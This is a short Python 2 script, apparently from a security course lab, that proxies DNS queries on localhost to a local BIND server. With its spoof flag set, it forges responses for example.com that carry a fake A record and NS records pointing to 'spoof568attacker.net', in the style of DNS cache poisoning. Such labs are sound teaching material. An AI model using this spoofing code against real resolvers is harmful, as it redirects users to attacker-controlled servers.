#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *


BUF_SIZE = 4096


parser = argparse.ArgumentParser()
parser.add_argument(
    "--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument(
    "--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true",
                    help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
proxy_sock.bind(('127.0.0.1', port))

origin_addr = None

while True:
    buf, addr = proxy_sock.recvfrom(BUF_SIZE)
    if origin_addr is None:
        origin_addr = addr

    if addr[1] == dns_port:  # recved from dns server
        proxy_sock.sendto(buf, origin_addr)
        origin_addr = None
    elif addr[1] == origin_addr[1]:  # recved from client
        if SPOOF:
            parsed_request = DNS(buf)
            if parsed_request.qd.qname == 'example.com.':
                response = DNS(id=parsed_request.id,
                               qr=1,
                               qd=parsed_request.qd,
                               an=DNSRR(rrname="example.com.",
                                        rdata="1.11.111.9",
                                        type='A'),
                               ns=(
                                   DNSRR(rrname="example.com.",
                                         rdata="ns1.spoof568attacker.net.",
                                         type='NS') /
                                   DNSRR(rrname="example.com.",
                                         rdata="ns2.spoof568attacker.net.",
                                         type='NS')
                               ))
                proxy_sock.sendto(bytes(response), origin_addr)
                origin_addr = None
                continue

        proxy_sock.sendto(buf, ('127.0.0.1', dns_port))
    else:
        raise Exception("received packet from unknown addr {}".format(addr))
